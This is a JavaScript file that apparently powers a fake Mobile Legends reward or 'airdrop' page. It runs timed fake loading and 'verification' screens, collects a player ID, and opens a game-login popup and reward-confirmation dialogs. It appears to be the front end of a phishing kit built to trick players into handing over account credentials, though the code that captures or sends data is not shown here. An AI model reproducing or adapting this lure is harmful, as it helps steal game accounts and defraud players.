// --- Audio ---
var buka = new Audio(); buka.src = "media/open.mp3";
var tutup = new Audio(); tutup.src = "media/close.mp3";
function audioFiles() { var a = document.getElementById('audioFiles'); if(a) a.play(); }
$(document).ready(function() { $("o").attr("onclick", "audioFiles()"); });

// --- Load Web ---
function load_web() {
    $('.container_load').show();
    $('.playerid_verification_new').css('display','flex').hide().fadeIn(400);
    setTimeout(function() { $('.container_load').hide(); $('.container_show').show(); }, 3000);
}

// --- Open Account Login ---
function open_account_login() {
    $('.account_login').show();
    $('.itemReward_confirmation,.itemRecall_confirmation,.many_confirmation,.once_rewards,.many_rewards').hide();
    $('.playersid').hide();
    $('#load-login').show();
    $('#text-login1').show();
    $('#box-login,#date-login').hide();
    setTimeout(function() { $('#load-login').hide(); $('.account_login').hide(); $('.mlbb_login').show(); }, 4000);
    setTimeout(function() { $('#text-login1').hide(); $('#text-login2').fadeIn(); }, 2000);
}

// --- Popup Functions ---
function open_veriflah() {
    $('.itemReward_confirmation,.itemRecall_confirmation').hide();
    $('.mlbb_login').show();
}
function open_process() {
    $('.processing_account').show();
    $('.itemReward_confirmation,.itemRecall_confirmation,.many_confirmation,.once_rewards,.many_rewards').hide();
}
function close_process() {
    $('.processing_account').hide();
    $('.header_uid').fadeIn();
    $('#btn-redeem').hide();
    $('#btn-once').hide();
    $('#btn-many').hide();
    $('#once_airdrop').hide();
    $('#many_airdrop').hide();
    $('#once_airdrop_on').show();
    $('#many_airdrop_on').show();
    $('#btn-redeem-on').show();
    $('#btn-once-on').show();
    $('#btn-many-on').show();
}
function open_itemReward_confirmation(ag) {
    var src = $(ag).attr("src"), name = $(ag).attr("data-name"), amount = $(ag).attr("data-id"), price = $(ag).attr("value");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src', src);
    $('#rewardName').html(name);
    $('#amount').html(amount);
    $('#price').html(price);
}
function open_itemRecall_confirmation(ag) {
    var src = $(ag).attr("src"), name = $(ag).attr("recall-name"), amountx = $(ag).attr("recall-id"), pricex = $(ag).attr("valuex");
    $('.itemRecall_confirmation').show();
    $('#myItemRecall_confirmationImg').attr('src', src);
    $('#recallName').html(name);
    $('#amountx').html(amountx);
    $('#pricex').html(pricex);
}
function close_itemReward_confirmation() { $('.itemReward_confirmation,.itemRecall_confirmation').hide(); }
function open_otherReward_confirmation(ag) {
    var src = $(ag).attr("src"), val = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src', src);
    $('#otherReward_confirmationValue').html(val);
}
function open_once_confirmation() { $('.once_confirmation').show(); }
function open_many_confirmation() { $('.many_confirmation').show(); }
function open_once_confirmation2() { $('.once_confirmation2').show(); }
function open_many_confirmation2() { $('.many_confirmation2').show(); }
function open_once_rewards() { $('.once_rewards').show(); $('.once_confirmation').hide(); }
function open_many_rewards() { $('.many_rewards').show(); $('.many_confirmation').hide(); }
function close_rewards() { $('.once_confirmation,.many_confirmation,.once_confirmation2,.many_confirmation2,.once_rewards,.many_rewards').hide(); }
function open_not_enough() { $('.not_enough').show(); }
function close_not_enough() { $('.not_enough').hide(); }
function open_error_fb() { $('.error_fb').show(); }
function open_se3low_airdrop() {
    $('.se3low_airdrop').show(); $('.once_confirmation').hide();
    setTimeout(function() { $('.once_rewards').fadeIn('slow'); $('.se3low_airdrop').fadeOut(); }, 6000);
}
function open_se3low_airdrops() {
    $('.se3low_airdrop').show(); $('.many_confirmation').hide();
    setTimeout(function() { $('.many_rewards').fadeIn('slow'); $('.se3low_airdrop').fadeOut(); }, 6000);
}
function open_se3low_airdrop2() {
    $('.se3low_airdrop').show(); $('.once_confirmation2').hide();
    setTimeout(function() { $('.once_rewards').fadeIn('slow'); $('.se3low_airdrop').fadeOut(); }, 6000);
}
function open_se3low_airdrops2() {
    $('.se3low_airdrop').show(); $('.many_confirmation2').hide();
    setTimeout(function() { $('.many_rewards').fadeIn('slow'); $('.se3low_airdrop').fadeOut(); }, 6000);
}
function removeBorder() { $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id'); }
function clearInput() {
    document.getElementById("goInputPlayIdForm").reset();
    $('.pengkhianat_box_form_login_id_error').removeClass().addClass('pengkhianat_box_form_login_id');
    $('.wrongPlayerId,.reqPlayerId').hide();
}
function verify_done() {
    $('#load-verify').show();
    $('#stepform').hide();
    setTimeout(function() { $('#load-verify').hide(); $('.account_verification').hide(); $('.processing_account').show(); }, 3000);
}
function imposeMinMax(el) {
    if(el.value != "") {
        if(parseInt(el.value) < parseInt(el.min)) el.value = el.min;
        if(parseInt(el.value) > parseInt(el.max)) el.value = el.max;
    }
}
function goInputPlayId() {
    $('#goInputPlayIdForm').submit(function(e) {
        e.preventDefault();
        var val = $('#beforeInput-PlayId').val().trim();
        if (!val) {
            $('.reqPlayerId').show();
            $('#wrongBoxId').addClass('pengkhianat_box_form_login_id_error');
            return false;
        }
        if (val.length <= 7 || val.length >= 15) {
            $('.wrongPlayerId').fadeIn();
            $('#wrongBoxId').addClass('pengkhianat_box_form_login_id_error');
            return false;
        }
        $('.wrongPlayerId,.reqPlayerId').hide();
        $('#wrongBoxId').removeClass('pengkhianat_box_form_login_id_error');
        $('.itemReward_confirmation,.itemRecall_confirmation').hide();
        $('.account_login').show();
        $('.playersid').hide();
        $('#load-login').show(); $('#text-login1').show(); $('#box-login,#date-login').hide();
        setTimeout(function() { $('#load-login').hide(); $('#box-login,#date-login').show(); }, 5000);
        setTimeout(function() { $('#text-login1').hide(); $('#text-login2').fadeIn(); }, 2000);
        $('#ValidatePopupPlayId, input#ValidatePopupPlayId').val(val);
    });
}

$(document).ready(function() {
    load_web();
});
